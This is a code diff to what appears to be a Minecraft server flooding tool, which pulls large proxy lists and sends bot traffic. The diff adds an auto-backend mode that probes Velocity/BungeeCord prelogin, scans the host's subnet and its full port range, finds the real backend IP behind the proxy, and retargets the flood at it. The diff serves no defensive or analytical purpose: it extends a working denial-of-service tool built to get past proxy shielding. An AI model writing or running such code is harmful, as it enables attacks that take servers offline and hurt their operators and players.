@@ -54,6 +54,12 @@ def _parse_args():
     p.add_argument("--offline-uuid", action="store_true",
                    help="explicit offline (Bungee) UUID in login_start")
     p.add_argument("--no-scan", action="store_true", help="realip: skip subnet scan")
+    p.add_argument("--auto-backend", action="store_true",
+                   help="flood modes: auto-find the real backend IP behind "
+                        "Velocity/Bungee (prelogin + host/subnet scan) and "
+                        "target it directly")
+    p.add_argument("--wide-scan", action="store_true",
+                   help="auto-backend: full 1024..65535 port scan of the host")
     p.add_argument("--chat-every", type=float, default=8.0, help="seconds between bot chats")
     p.add_argument("--quiet", action="store_true")
     p.add_argument("--json", action="store_true", help="json output (status/realip)")
@@ -172,6 +178,38 @@ async def _run_flood(args, mode):
         fetched = await proxies_mod.fetch_proxies(limit=1500)
         proxies.extend(fetched)
     pvn = protocol_of(version)
+    log = lambda m: None if args.quiet else print(m)
+
+    if getattr(args, "auto_backend", False):
+        found = await realip_mod.find_real_ip_async(
+            args.host, args.port, protocol=pvn,
+            scan_subnet=not args.no_scan, scan_wide=args.wide_scan,
+            log=(lambda m: None if args.quiet else print(m)))
+        if found:
+            # pick the best backend: explicit match, then prelogin, then top score
+            def rank(f):
+                if f.get("match"): return 1000
+                via = f.get("via", "")
+                if via.startswith(("velocity-prelogin", "bungeecord-prelogin")):
+                    return 900
+                if via.startswith("same-host-portscan"):
+                    return 800 + f.get("score", 0) / 1000
+                if via.startswith("subnet-scan:same-motd"):
+                    return 700
+                if via == "direct":
+                    return 600
+                return 100
+            best = max(found, key=rank)
+            log(f"auto-backend: {args.host}:{args.port} -> {best['ip']}:{best['port']} "
+                f"(via {best.get('via')})")
+            args.host, args.port = best["ip"], best["port"]
+            # re-resolve version to the backend's reported protocol if available
+            binfo = best.get("status") or {}
+            bp = (binfo.get("version") or {}).get("protocol")
+            if bp:
+                log(f"auto-backend: backend protocol {bp} (using -v {version})")
+        else:
+            log("auto-backend: none found, keeping original host")
 
     stop = {"flag": False}
     def _stop(signum, frame):
